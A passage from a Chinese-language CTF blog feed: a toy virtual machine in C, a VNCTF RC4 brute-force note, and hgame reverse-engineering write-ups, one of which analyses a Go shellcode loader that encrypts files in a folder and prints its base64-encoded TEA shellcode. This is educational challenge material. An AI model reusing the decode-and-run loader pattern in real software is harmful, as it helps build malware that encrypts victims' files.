class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JMP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JNE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>            <span class=\"token keyword\">case</span> HLT<span class=\"token operator\">:</span> <span class=\"token comment\">// 停止执行</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将运行状态置为 0s</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"178\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t<span class=\"token comment\">// 定义一个测试函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token comment\">// 定义一段测试程序 实现一个异或</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 瞎输的一串数据</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    */</pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取数据到内存</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span>PUSH<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>CMP<span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>JNE<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 加载测试程序到虚拟机内存中，并获取程序长度</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印程序长度</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 执行虚拟机</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"200\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 打印寄存器的值</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 打印内存中的数据</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印执行结束</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"实现了一个简单的加密\"><a class=\"markdownIt-Anchor\" href=\"#实现了一个简单的加密\">#</a> 实现了一个简单的加密:</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    */</pre></td></tr></table></figure><p>呜呜呜 本来想用虚拟机实现一个 TEA 加密的 但是这几天得甲流了等我写出来了 再贴上来</p>\n<h2 id=\"lc-3虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#lc-3虚拟机\">#</a> LC-3 虚拟机</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuam1laW5lcnMuY29tL2xjMy12bS8=\">https://www.jmeiners.com/lc3-vm/</span></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/VNCTF/",
            "url": "https://3cly.github.io/2023/02/26/VNCTF/",
            "title": "VNCTF",
            "date_published": "2023-02-26T06:23:40.000Z",
            "content_html": "<h3 id=\"pzgalaxy\"><a class=\"markdownIt-Anchor\" href=\"#pzgalaxy\">#</a> PZGalaxy</h3>\n<p><img data-src=\"/images/image-20230226142653906.png\" alt=\"image.png\"></p>\n<p>根据附件的 md 文件操作打开网站 (本地的话直接点 html 文件) 按 F12 发现 RC4 加密 密文已经给出 密钥共 8 位，给出四位 2023 剩下 4 位爆破即可 注意这里是 js 语言</p>\n<p>我用的火狐浏览器可以 F12 打开开发者工具 在查看器修改 JS 源码</p>\n<p><img data-src=\"/images/image-20230226143924553.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230226144054689.png\" alt=\"image.png\"></p>\n<p>把后面部分改成爆破后提交就行了</p>\n<p><img data-src=\"/images/image-20230226144152360.png\" alt=\"image.png\"></p>\n<p>这里 flag 和 WP 不一样应该是因为动态 flag 的原因吧</p>\n<p><img data-src=\"/images/image-20230226145023901.png\" alt=\"image.png\"></p>\n<p>一个是 0 一个是 1  0-127</p>\n<p>其实也可以复制数据出来用 python 或者 C 语言爆破</p>\n<p>后面题就没看了 复习考试去了</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "url": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "title": "shellcode&&vm",
            "date_published": "2023-02-26T06:09:59.000Z",
            "content_html": "<p>其实是 hgame week4 的啦</p>\n<h3 id=\"shellcode\"><a class=\"markdownIt-Anchor\" href=\"#shellcode\">#</a> shellcode</h3>\n<p><img data-src=\"/images/image-20230210134708555.png\" alt=\"image.png\"></p>\n<p>DIE 中查看发现为 GO 语言</p>\n<p><img data-src=\"/images/image-20230210135005805.png\" alt=\"image.png\"></p>\n<p>IDA 中查看主函数发现有 base64</p>\n<p>程序逻辑：对 shellcode 进行 base64 解码，然后分配内存，遍历文件夹读文件，调用函数加密，写文件。</p>\n<p><img data-src=\"/images/image-20230210142817599.png\" alt=\"image.png\"></p>\n<p>复制找到的字符串去解密为新文件 (base64 肯定是可见字符呀)</p>\n<p>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</p>\n<p><img data-src=\"/images/image-20230210142329512.png\" alt=\"image.png\"></p>\n<p>010 编辑器选择粘贴自 base64</p>\n<p><img data-src=\"/images/image-20230210142534042.png\" alt=\"image.png\"></p>\n<p>新文件用 IDA 选择 64 位打开全选后 create function 再按 F5 发现一个 TEA</p>\n<p><img data-src=\"/images/image-20230210142649727.png\" alt=\"image.png\"></p>\n<p>附件的 enc 文件就是加密过的数据 解 TEA 之后就能得到 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x6d616768</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68747b65</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x315f7331</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68745f73</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x75745f33</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x73277574</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6d30685f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x72307765</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7d6b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4adb98d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xacb9e545</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag <span class=\"token operator\">+=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#b\"hgame&#123;th1s_1s_th3_tutu's_h0mew0rk&#125;\\x00\\x8d\\xb9\\xad\\x04E\\xe5\\xb9\\xac\"</span></pre></td></tr></table></figure><p>官方总结:</p>\n<p>根据题目名称和提示来看，此题为一个 shellcode 加载器，程序运行过程中会解密一段机器码来运<br>\n行。go 编译的程序主函数为 main_main。观察 ida 反编译出来的内容，可很明显的观察到 base64 解<br>\n码的内容，所以我们将题目中的 base64 解码并保存成文件，使用 ida 打开，即可看出是 tea 加密算<br>\n法。之后再分析题目的文件读取和加密逻辑，发现就是很普通的 8 字节一组调用一次 base64 的机器<br>\n码，所以写解密脚本即可。</p>\n<h3 id=\"vm\"><a class=\"markdownIt-Anchor\" href=\"#vm\">#</a> VM</h3>\n<p>附件为一个 64 位程序 放进 IDA 中</p>\n<p><img data-src=\"/images/image-20230213172010050.png\" alt=\"image.png\"></p>\n<p>在 main 函数中，可以看到第 8 行初始化了 vm 的结构体</p>\n<p><img data-src=\"/images/image-20230213172927883.png\" alt=\"image.png\"></p>\n<p>点开 vm 的主体，可以看到一个 while 循环，byte_140005360 是一个全局数组，该循环在全局数组中按 (a1+24) 下标取的数据只要不是 255 就继续执行，因此该全局数组为 code，就是本虚拟机的字节码数组。而 (a1+24) 应该是 rip 寄存器。</p>\n<p><img data-src=\"/images/image-20230213174104326.png\" alt=\"image.png\"></p>\n<p>进入 sub_140001940 函数 switch-case 结构，这些不同的 case 就对应不同指令了</p>\n<p>点开 case0</p>\n<p><img data-src=\"/images/image-20230213174612440.png\" alt=\"image.png\"></p>\n<p>首先 a1 [6] 就是 (a1+24)  (int 为 4 字节)  也就是 rip   分析猜测为 mov 指令 *a1 是寄存器</p>\n<p>后面分析的时候按照官方 WP 给出的方法在 ida 中新建一个 struct，将 rip 的偏移确定这样好看一点</p>\n<p><img data-src=\"/images/image-20230213180631392.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230213180716750.png\" alt=\"image.png\"></p>\n<p>再按 Y 改 a1 类型 （是指针的哇）</p>\n<p><img data-src=\"/images/image-20230213181028046.png\" alt=\"image.png\"></p>\n<p>case1 有明显的栈操作的特征，所以此处是 push，而 unknown2 [0] 我们也可以确定是 rsp</p>\n<p>根据分析过程完善定义的 vm 结构体</p>\n<p><img data-src=\"/images/image-20230213181923702.png\" alt=\"image.png\"></p>\n<p>(zf 标志寄存器，用 0 和 1 记录计算结果)</p>\n<p><img data-src=\"/images/image-20230213182227616.png\" alt=\"image.png\"></p>\n<p>再看后面的就很清晰了 case2 为 pop 出栈</p>\n<p><img data-src=\"/images/image-20230213182403514.png\" alt=\"image.png\"></p>\n<p>case3 为进行运算的操作 （wp 直接用 alu 概括了)</p>\n<p><img data-src=\"/images/image-20230213182731775.png\" alt=\"image.png\"></p>\n<p>case4 是 cmp 比较 zf 寄存器记录结果</p>\n<p><img data-src=\"/images/image-20230213182909882.png\" alt=\"image.png\"></p>\n<p>case5 是跳转 jmp</p>\n<p><img data-src=\"/images/image-20230213182952253.png\" alt=\"image.png\"></p>\n<p>case6 是 jne 不相等跳转 (左操作数≠右操作数)</p>\n<p><img data-src=\"/images/image-20230213183618015.png\" alt=\"image.png\"></p>\n<p>case7 是 je 相等跳转 (左操作数 = 右操作数)</p>\n<p>lazy IDA 提取出 data (input) 和字节码数组 写反汇编器把程序转换为汇编语言</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>data<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span 